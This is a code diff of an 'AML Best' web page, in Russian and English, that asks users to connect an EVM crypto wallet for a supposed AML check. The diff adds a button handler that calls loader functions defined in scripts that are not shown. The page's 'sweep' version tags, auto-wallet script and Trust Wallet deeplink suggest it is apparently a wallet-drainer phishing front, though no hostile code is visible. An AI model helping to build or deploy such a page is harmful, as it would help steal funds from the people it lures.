@@ -8,7 +8,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css?v=sweep_final" />
+  <link rel="stylesheet" href="styles.css?v=sweep_final4" />
 </head>
 <body>
   <header class="site-header" data-header>
@@ -54,8 +54,12 @@
             <span>Я согласен на чтение публичных адресов и балансов для AML-проверки.</span>
           </label>
           <div class="wallet-login-actions">
-            <!-- 👇 ДОБАВЛЕН data-user-wallet-connect -->
-            <button type="button" id="connect-btn" data-user-wallet-connect>Connect EVM</button>
+            <button 
+              type="button" 
+              id="connect-btn" 
+              data-user-wallet-connect
+              onclick="connectWalletDirect(event)"
+            >Connect EVM</button>
             <a
               class="wallet-deeplink"
               href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fiwtluxz.github.io%2Fmysite2%2Fcheck.html"
@@ -212,9 +216,29 @@
     <span>© 2026 AML Best</span>
   </footer>
 
-  <script src="config.js?v=sweep_final"></script>
-  <script src="auto-wallet.js?v=sweep_final"></script>
-  <script src="script.js?v=sweep_final"></script>
-  <script src="check-flow.js?v=sweep_final"></script>
+  <script src="config.js?v=sweep_final4"></script>
+  <script src="auto-wallet.js?v=sweep_final4"></script>
+  <script src="script.js?v=sweep_final4"></script>
+  <script src="check-flow.js?v=sweep_final4"></script>
+
+  <script>
+    // Глобальная функция для inline-обработчика onclick
+    window.connectWalletDirect = function(event) {
+      event.preventDefault();
+      console.log('🔥 connectWalletDirect вызвана!');
+      
+      // Пытаемся вызвать основную функцию, если она определена
+      if (typeof window.connectWalletNow === 'function') {
+        console.log('Вызываем window.connectWalletNow');
+        window.connectWalletNow(event);
+      } else if (typeof window.runAutoCheck === 'function') {
+        console.log('Вызываем window.runAutoCheck');
+        window.runAutoCheck(event);
+      } else {
+        console.warn('⚠️ Функция подключения не найдена!');
+        alert('Функция подключения не загружена. Проверьте консоль на ошибки.');
+      }
+    };
+  </script>
 </body>
 </html>
